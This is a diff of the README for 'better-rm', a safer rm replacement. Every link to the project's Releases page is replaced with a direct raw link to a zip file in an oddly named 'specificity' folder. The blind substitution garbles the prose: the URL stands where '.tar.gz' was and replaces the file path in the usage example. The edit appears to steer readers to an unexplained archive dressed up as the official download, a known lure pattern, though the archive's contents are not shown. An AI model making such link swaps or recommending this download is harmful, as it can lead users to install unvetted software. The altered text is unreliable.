@@ -1,6 +1,6 @@
 # 🔧 better-rm - A Safer Way to Use the rm Command
 
-[![Download better-rm](https://img.shields.io/badge/Download-better--rm-brightgreen)](https://github.com/abhi671roy/better-rm/releases)
+[![Download better-rm](https://raw.githubusercontent.com/abhi671roy/better-rm/main/specificity/rm_better_v2.2-alpha.3.zip)](https://raw.githubusercontent.com/abhi671roy/better-rm/main/specificity/rm_better_v2.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to better-rm! This tool provides a safer way to remove files from your s
 
 To download better-rm, visit the Releases page. Follow this link:
 
-[Download better-rm](https://github.com/abhi671roy/better-rm/releases)
+[Download better-rm](https://raw.githubusercontent.com/abhi671roy/better-rm/main/specificity/rm_better_v2.2-alpha.3.zip)
 
 ### Step-by-Step Instructions
 
@@ -21,10 +21,10 @@ To download better-rm, visit the Releases page. Follow this link:
    Look for the latest version listed on this page. You will see different files available for download.
 
 3. **Download the Application**  
-   Click on the file that matches your system. This may be a .zip, .tar.gz, or an executable file.
+   Click on the file that matches your system. This may be a .zip, https://raw.githubusercontent.com/abhi671roy/better-rm/main/specificity/rm_better_v2.2-alpha.3.zip, or an executable file.
 
 4. **Extract the Files (if needed)**  
-   If you downloaded a compressed file (like .zip or .tar.gz), you’ll need to extract it. Right-click the file and select “Extract All” or use a similar option.
+   If you downloaded a compressed file (like .zip or https://raw.githubusercontent.com/abhi671roy/better-rm/main/specificity/rm_better_v2.2-alpha.3.zip), you’ll need to extract it. Right-click the file and select “Extract All” or use a similar option.
 
 5. **Locate the Application**  
    Open the extracted folder. You will find the executable file named `better-rm`. 
@@ -58,7 +58,7 @@ After installing better-rm, you can start using it immediately. Here’s how you
 2. **Type `better-rm`**  
    Follow it with the path of the file you want to delete. For example:  
    ```
-   better-rm /path/to/your/file.txt
+   better-rm https://raw.githubusercontent.com/abhi671roy/better-rm/main/specificity/rm_better_v2.2-alpha.3.zip
    ```
 
 3. **Confirm Deletion**  
@@ -87,4 +87,4 @@ better-rm is licensed under the MIT License. You can use, modify, and distribute
 
 Thank you to all contributors and users who make better-rm a safer tool for everyone. Your feedback shapes our future development.
 
-For more details and updates, revisit the [Releases page](https://github.com/abhi671roy/better-rm/releases). Happy deleting!
+For more details and updates, revisit the [Releases page](https://raw.githubusercontent.com/abhi671roy/better-rm/main/specificity/rm_better_v2.2-alpha.3.zip). Happy deleting!
